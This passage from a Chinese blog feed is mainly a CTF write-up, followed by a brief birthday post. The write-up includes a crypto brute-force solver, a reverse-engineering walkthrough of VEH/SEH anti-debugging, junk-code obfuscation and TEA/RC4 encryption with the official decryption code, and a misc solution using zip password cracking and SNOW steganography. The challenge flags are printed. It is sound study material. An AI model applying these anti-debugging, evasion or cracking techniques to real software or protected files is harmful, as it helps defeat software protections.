chain20_1[j//<span class="number">2</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ring_40[j] = chain20_2[(j//<span class="number">2</span>+i3)%<span class="number">20</span>]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">                dictionary[ring_40[j]] = ring_40[(j+<span class="number">1</span>)%<span class="number">40</span>]	</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):								</span><br><span class="line">                ring_18 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>)]</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">                    <span class="keyword">if</span>(j%<span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">                        ring_18[j] = chain9_1[j//<span class="number">2</span>]</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        ring_18[j] = chain9_2[(j//<span class="number">2</span> + i4)%<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">                    dictionary[ring_18[j]] = ring_18[(j+<span class="number">1</span>)%<span class="number">18</span>]	</span><br><span class="line">                    		</span><br><span class="line">                <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):								</span><br><span class="line">                    ring_8 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                        <span class="keyword">if</span>(j%<span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">                            ring_8[j] = chain4_1[j//<span class="number">2</span>]</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            ring_8[j] = chain4_2[(j//<span class="number">2</span>+i5)%<span class="number">4</span>]</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                        dictionary[ring_8[j]] = ring_8[(j+<span class="number">1</span>)%<span class="number">8</span>]</span><br><span class="line">                        </span><br><span class="line">                    M = [dictionary[j]+<span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">                    mask = P(M)</span><br><span class="line">                    mul = P(mul)</span><br><span class="line">                    _<span class="built_in">hash</span> = sha512(<span class="built_in">str</span>(mask).encode()).hexdigest()</span><br><span class="line">                    mask_hash = <span class="string">&quot;91881f508f08fbafec1a6879fc3a1f215135c94c78f03fae8534d54dc05bd4a122a4e4508d32b9e02be08fbbb42a9e3335fc433c20e2da2e012d11b7324f6952&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> _<span class="built_in">hash</span> == mask_hash:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;P= <span class="subst">&#123;mask&#125;</span>&quot;</span>)</span><br><span class="line">                        temp = sha512(<span class="built_in">str</span>(mask * mul).encode()).hexdigest()</span><br><span class="line">                        <span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line">                        flag = msg ^ <span class="built_in">int</span>(temp,<span class="number">16</span>)</span><br><span class="line">                        <span class="built_in">print</span>(n2s(<span class="built_in">int</span>(flag)))</span><br></pre></td></tr></table></figure>
<p>这题写的时候出了好多bug… 以后有空再自己写一遍</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h2><p>挺好的题的 只是为什么我的 <code>byte_41C0A0</code> 怎么都找不到值啊…<br>除开这点(就是得不到flag罢了) 还是有些知识点值得记录下的<br>考点: 花指令 异常处理<br>VEH和SEH的区别： SEH是基于线程的 而 VEH是基于进程的</p>
<p>IDA打开<br>main开头就有个<br><code>ExceptionList = NtCurrentTeb()-&gt;NtTib.ExceptionList;</code><br>继续分析main</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddVectoredExceptionHandler = (PVOID (__stdcall *)(ULONG, PVECTORED_EXCEPTION_HANDLER))GetProcAddress(</span><br><span class="line">                                                                                         hModule,</span><br><span class="line">                                                                                         &quot;AddVectoredExceptionHandler&quot;);</span><br><span class="line">AddVectoredExceptionHandler(0, Handler);</span><br><span class="line">if ( !sub_401350(ExceptionList, &amp;loc_401660) )</span><br><span class="line">&#123;</span><br><span class="line">  sub_401520();</span><br><span class="line">  ExitProcess(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里add VEH 后进行了调试检测 有个很有趣的点:<br>sub_401520点进去是这样的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">sub_401520</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  BOOL result; <span class="comment">// eax</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">DEBUG_EVENT</span> <span class="title">DebugEvent</span>;</span> <span class="comment">// [esp+4Ch] [ebp-4B8h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> <span class="title">StartupInfo</span>;</span> <span class="comment">// [esp+B0h] [ebp-454h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> <span class="title">ProcessInformation</span>;</span> <span class="comment">// [esp+F4h] [ebp-410h] BYREF</span></span><br><span class="line">  CHAR Filename[<span class="number">1024</span>]; <span class="comment">// [esp+104h] [ebp-400h] BYREF</span></span><br><span class="line"></span><br><span class="line">  StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;StartupInfo.lpReserved, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  GetModuleFileNameA(<span class="number">0</span>, Filename, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !CreateProcessA(Filename, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation) )</span><br><span class="line">    sub_4013C0(<span class="number">404</span>);</span><br><span class="line">  sub_4013C0(<span class="number">2</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;DebugEvent, <span class="number">0</span>, <span class="keyword">sizeof</span>(DebugEvent));</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, dwContinueStatus);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是如果我们没有调试的话它就自己启动了一个自调试<br>继续看<br>首先要输入一个v15 进行了一系列约束check 很容易爆破出flag1&#x3D;20220222<br>接下来输入Str check长度为32后 触发了一个异常</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXCEPTION_ACCESS_VIOLATION         0xC0000005     </span><br><span class="line">程序企图读写一个不可访问的地址时引发的异常。例如企图读取0地址处的内存</span><br></pre></td></tr></table></figure>
<p>这里的异常会被VEH处理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LONG __stdcall Handler(struct _EXCEPTION_POINTERS *ExceptionInfo)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v1; // eax</span><br><span class="line">  DWORD Value; // [esp+50h] [ebp-508h]</span><br><span class="line">  char v4[256]; // [esp+54h] [ebp-504h] BYREF</span><br><span class="line">  char *Source; // [esp+154h] [ebp-404h]</span><br><span class="line">  char Destination[256]; // [esp+158h] [ebp-400h] BYREF</span><br><span class="line">  char Str[256]; // [esp+258h] [ebp-300h] BYREF</span><br><span class="line">  char v8[256]; // [esp+358h] [ebp-200h] BYREF</span><br><span class="line">  char v9[256]; // [esp+458h] [ebp-100h] BYREF</span><br><span class="line"></span><br><span class="line">  memset(v9, 0, sizeof(v9));</span><br><span class="line">  memset(v8, 0, sizeof(v8));</span><br><span class="line">  memset(Str, 0, sizeof(Str));</span><br><span class="line">  memset(v4, 0, sizeof(v4));</span><br><span class="line">  Source = (char *)ExceptionInfo-&gt;ContextRecord-&gt;Edx;</span><br><span class="line">  Value = ExceptionInfo-&gt;ContextRecord-&gt;Eax;</span><br><span class="line">  if ( ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode != 0xC0000005 )</span><br><span class="line">    return 0;</span><br><span class="line">  strcpy(Destination, Source);</span><br><span class="line">  _itoa(Value, Str, 8);</span><br><span class="line">  v1 = strlen(Str);</span><br><span class="line">  sub_401080(v9, v8, Str, v1);</span><br><span class="line">  sub_4010F0(v9, v8);</span><br><span class="line">  sub_4011A0(v9, Str, 256);</span><br><span class="line">  sub_4012A0(Str, Destination, Source, 32);</span><br><span class="line">  ExceptionInfo-&gt;ContextRecord-&gt;Eip += 6;</span><br><span class="line">  return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里看到Source来自edx指向的值<br>而这里可以看到 edx确实指向了Str</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401D6F                 lea     ecx, [ebp+Str]</span><br><span class="line">.text:00401D75                 mov     [ebp+var_8], ecx</span><br><span class="line">.text:00401D78                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:00401D7B                 mov     eax, [ebp+var_14]</span><br></pre></td></tr></table></figure>
<p>这一段点进去查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v1 = strlen(Str);</span><br><span class="line">  sub_401080(v9, v8, Str, v1);</span><br><span class="line">  sub_4010F0(v9, v8);</span><br><span class="line">  sub_4011A0(v9, Str, 256);</span><br><span class="line">  sub_4012A0(Str, Destination, Source, 32);</span><br></pre></td></tr></table></figure>
<p>会发现是个RC4加了一点xor<br>处理完异常后 发现下面又有一句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NtClose = (NTSTATUS (__stdcall *)(HANDLE))GetProcAddress(::hModule, &quot;NtClose&quot;);</span><br></pre></td></tr></table></figure>
<p>这是为什么呢?<br>新知识:</p>
<ul>
<li>调用NtClose 会释放一个无效句柄 如果没有被调试返回FALSE 否则抛出异常 0xC0000008</li>
</ul>
<p>这就是为什么前面要启动自调试 就是为了在这里抛出异常 被SEH捕获<br>转到开头SEH的地方<br>细心查看这里会发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401B2C                 rep stosd</span><br><span class="line">.text:00401B2E                 lea     eax, loc_401660</span><br><span class="line">.text:00401B34                 push    eax</span><br><span class="line">.text:00401B35                 mov     eax, large fs:0</span><br><span class="line">.text:00401B3B                 push    eax</span><br></pre></td></tr></table></figure>
<p>这里调用了loc_401660<br>点击跳转会发现这是一个加了花指令的函数 没有被IDA正常识别<br>观察发现有 junk code </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401678                 jz      short near ptr loc_40167C+1</span><br><span class="line">.text:0040167A                 jnz     short near ptr loc_40167C+1</span><br><span class="line">.text:0040167C</span><br><span class="line">.text:0040167C loc_40167C:                             ; CODE XREF: .text:00401678↑j</span><br><span class="line">.text:0040167C                                         ; .text:0040167A↑j</span><br><span class="line">.text:0040167C                 call    near ptr 13C5C48h</span><br><span class="line">.text:0040167C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401681                 db 3 dup(0)</span><br></pre></td></tr></table></figure>
<p>全部nop掉 C一C P一P就能F5了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401660</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+4Ch] [ebp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+50h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+54h] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+6Ch] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+70h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+74h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+78h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v9 = a2 + <span class="number">116</span>;</span><br><span class="line">  v8 = a2 + <span class="number">116</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    v5 = *(_DWORD *)(v8 + <span class="number">4</span> * i);</span><br><span class="line">    v4 = *(_DWORD *)(v8 + <span class="number">4</span> * i + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">32</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 -= <span class="number">559038737</span>;</span><br><span class="line">      v5 += (*(<span class="type">unsigned</span> __int8 *)(v9 + (<span class="number">4</span> * i + <span class="number">8</span>) % <span class="number">32</span> + <span class="number">1</span>) + (v4 &gt;&gt; <span class="number">5</span>)) ^ (v6 + v4) ^ (*(<span class="type">unsigned</span> __int8 *)(v9 + (<span class="number">4</span> * i + <span class="number">8</span>) % <span class="number">32</span>)</span><br><span class="line">                                                                                       + <span class="number">16</span> * v4);</span><br><span class="line">      v4 += (*(<span class="type">unsigned</span> __int8 *)(v9 + (<span class="number">4</span> * i + <span class="number">8</span>) % <span class="number">32</span> + <span class="number">3</span>) + (v5 &gt;&gt; <span class="number">5</span>)) ^ (v6 + v5) ^ (*(<span class="type">unsigned</span> __int8 *)(v9 + (<span class="number">4</span> * i + <span class="number">8</span>) % <span class="number">32</span> + <span class="number">2</span>)</span><br><span class="line">                                                                                       + <span class="number">16</span> * v5);</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(v8 + <span class="number">4</span> * i) = v5;</span><br><span class="line">    *(_DWORD *)(v8 + <span class="number">4</span> * i + <span class="number">4</span>) = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个魔改的tea<br>所以程序对我们的输入进行了 RC4+xor+tea<br>最后的check<br>将32个字符再xor一个key数组后两两一组映射到一个二维数组上 并与已知(??????)的一个二维数组比较check<br>整个题还是很不错的 只是为什么我就是找不到”已知”的二维数组的值啊…<br>贴个官方exp(硬是不告诉我truemap是多少对吧😄):<br>这里exp写的挺好的 用C的 unsigned char 和 unsigned int 省去了数据类型转换的麻烦<br>还有就是一个小细节 : tea逆向的时候外层循环也要倒着循环</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;dataFlag.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tea</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* str)</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tea解密中\n&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>* box = (<span class="type">unsigned</span> <span class="type">int</span>*) str;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">6</span>; i &gt;= <span class="number">0</span>; i = i - <span class="number">2</span>)&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> k0 = str[(i + <span class="number">2</span>) * <span class="number">4</span> % <span class="number">32</span>], k1 = str[(i + <span class="number">2</span>) * <span class="number">4</span> % <span class="number">32</span> + <span class="number">1</span>],</span><br><span class="line">k2 = str[(i + <span class="number">2</span>) * <span class="number">4</span> % <span class="number">32</span> + <span class="number">2</span>], k3 = str[(i + <span class="number">2</span>) * <span class="number">4</span> % <span class="number">32</span> + <span class="number">3</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> delta=<span class="number">0xDEADBEEF</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l = box[i], r=box[i + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> ii = <span class="number">0</span>; ii &lt; <span class="number">32</span>; ii++)&#123;</span><br><span class="line">sum+=delta;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)&#123;</span><br><span class="line">r-=((l&lt;&lt;<span class="number">4</span>)+k2)^(l+sum)^((l&gt;&gt;<span class="number">5</span>)+k3);</span><br><span class="line">l-=((r&lt;&lt;<span class="number">4</span>)+k0)^(r+sum)^((r&gt;&gt;<span class="number">5</span>)+k1);</span><br><span class="line">sum-=delta;</span><br><span class="line">&#125;</span><br><span class="line">box[i] = l;</span><br><span class="line">box[i + <span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tea解密完毕\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">initST</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *S, <span class="type">unsigned</span> <span class="type">char</span> *T, <span class="type">unsigned</span> <span class="type">char</span> *K, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">S[i] = i;</span><br><span class="line">T[i] = K[i%len];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">initS</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *S, <span class="type">unsigned</span> <span class="type">char</span> *T)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0x00</span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">j = (j + S[i] + T[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = S[j];</span><br><span class="line">S[j] = S[i];</span><br><span class="line">S[i] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">initK</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *S, <span class="type">unsigned</span> <span class="type">char</span> *K, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0x00</span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> r = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(r=<span class="number">0</span>; r&lt;len; r++)</span><br><span class="line">&#123;</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">j = (j + S[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = S[j];</span><br><span class="line">S[j] = S[i];</span><br><span class="line">S[i] = tmp;</span><br><span class="line">t = (S[i] + S[j]) % <span class="number">256</span>;</span><br><span class="line">K[r] = S[t];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">RC4</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *K, <span class="type">unsigned</span> <span class="type">char</span> *M, <span class="type">unsigned</span> <span class="type">char</span> *E, <span class="type">int</span> len)</span>&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ans[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">memcpy</span>(ans, M,<span class="number">32</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">E[i] = (M[i] ^ K[i]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">E[i] = (M[i] ^ K[i] ^ ans[K[i] % i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">RC4_ENC</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* enc)</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RC4解密中\n&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> T[<span class="number">256</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> K[<span class="number">256</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> M[<span class="number">256</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* E = enc;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> C[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(S, <span class="number">0x00</span>, <span class="keyword">sizeof</span>(S));</span><br><span class="line"><span class="built_in">memset</span>(T, <span class="number">0x00</span>, <span class="keyword">sizeof</span>(T));</span><br><span class="line"><span class="built_in">memset</span>(K, <span class="number">0x00</span>, <span class="keyword">sizeof</span>(K));</span><br><span class="line"><span class="built_in">memset</span>(C, <span class="number">0x00</span>, <span class="keyword">sizeof</span>(C));</span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span>*)M, (<span class="type">char</span>*)E);</span><br><span class="line">itoa(<span class="number">20220222</span>, (<span class="type">char</span>*)K, <span class="number">8</span>);</span><br><span class="line">initST(S, T, K, <span class="built_in">strlen</span>((<span class="type">char</span>*)K));</span><br><span class="line">initS(S, T);</span><br><span class="line">initK(S, K, <span class="number">256</span>);</span><br><span class="line">RC4(K, M, E, <span class="number">32</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RC4解密完毕\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> keyMap[] =</span><br><span class="line">&#123;<span class="number">241</span>,<span class="number">239</span>,<span class="number">97</span>,<span class="number">187</span>,<span class="number">201</span>,<span class="number">69</span>,<span class="number">87</span>,<span class="number">67</span>,<span class="number">54</span>,<span class="number">235</span>,<span class="number">195</span>,<span class="number">245</span>,<span class="number">97</span>,<span class="number">31</span>,<span class="number">224</span>,<span class="number">237</span>,<span class="number">95</span>,<span class="number">25</span>,<span class="number">195</span>,<span class="number">131</span>,<span class="number">11</span>,<span class="number">103</span>,<span class="number">9</span></span><br><span class="line"><span class="number">1</span>,<span class="number">68</span>,<span class="number">122</span>,<span class="number">157</span>,<span class="number">178</span>,<span class="number">126</span>,<span class="number">245</span>,<span class="number">181</span>,<span class="number">34</span>,<span class="number">101</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> index = <span class="number">0</span>, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> enc[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">300</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">300</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(TrueMap[i][j] == <span class="number">1</span>)&#123;</span><br><span class="line">enc[index++] = i;</span><br><span class="line">enc[index++] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">32</span>; i++)&#123;</span><br><span class="line">enc[i] ^= keyMap[i];</span><br><span class="line">&#125;</span><br><span class="line">Tea(enc);</span><br><span class="line">RC4_ENC(enc);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,enc);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后第二部分flag的值: b0fa99f5bbd8bcf85d029dfd3033de7f</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="xxx-下雪了"><a href="#xxx-下雪了" class="headerlink" title="xxx 下雪了"></a>xxx 下雪了</h2><p>对我来说挺新颖的<br>首先是一个压缩包密码爆破 题目给了字典 爆就完了<br>密码: blueSHARK666<br>然后在tip.txt找到很大一串base64 学到这是base64嵌套 一直解 解到最后一步得到:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>又学习到了这种用词频统计</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span></span><br><span class="line">strings = s <span class="comment">#文件打开处</span></span><br><span class="line"> </span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alphabet:</span><br><span class="line">	counts = strings.count(i)</span><br><span class="line">	i = <span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">	result[i] = counts</span><br><span class="line"> </span><br><span class="line">res = <span class="built_in">sorted</span>(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> res:</span><br><span class="line">	<span class="built_in">print</span>(data)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">	flag = <span class="built_in">str</span>(i[<span class="number">0</span>])</span><br><span class="line">	<span class="built_in">print</span>(flag[<span class="number">0</span>],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>得到出现频率 : ISCTFZ023daGYXpJmbNxMcEjn5BeoOQy4D9q6PAfghiklrstuvwzHKLRUVW178!@#$%^&amp;*()_+- &#x3D;{}[]<br>有意义的为 ISCTFZ023 作为snow隐写的密码 最后得到flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./SNOW.EXE -C -p ISCTFZ023 flag.txt</span><br></pre></td></tr></table></figure>
<p>flag: ISCTF{34da-a87s-sk87-s384-3982-398233}</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1>]]></content>
      <categories>
        <category>CTF-WP</category>
      </categories>
  </entry>
  <entry>
    <title>12.6 Birthday-For-Ulganoy</title>
    <url>/2023/12/05/12-6-Birthday-For-Ulganoy/</url>
    <content><![CDATA[<p>20岁生日🎂</p>
<span id="more"></span>
<p>笑死 明天把概率统计学好就是最好的庆生(🤣)！</p>
<p>辗转许久 终于能一步步向自己的目标迈进了！<br>虽然学校的课很sb… 但可以自学好多好多有趣的内容！<br>CTF是以练促学的手段 趁现在还有精力的时候多学点<br>web pwn reverse crypto 都那么的有意思啊！<br>web&#x2F;pwn自不必说(HackerDesu<em>★,°</em>:.☆(￣▽￣)&#x2F;$:<em>.°★</em> 。)<br>reverse<del>毕竟我是要解包万华镜</del>也要学好<br>crypto可以很好的促进数学的学习和锻炼思维能力<br>努力自我提升吧！！！頑張る！</p>
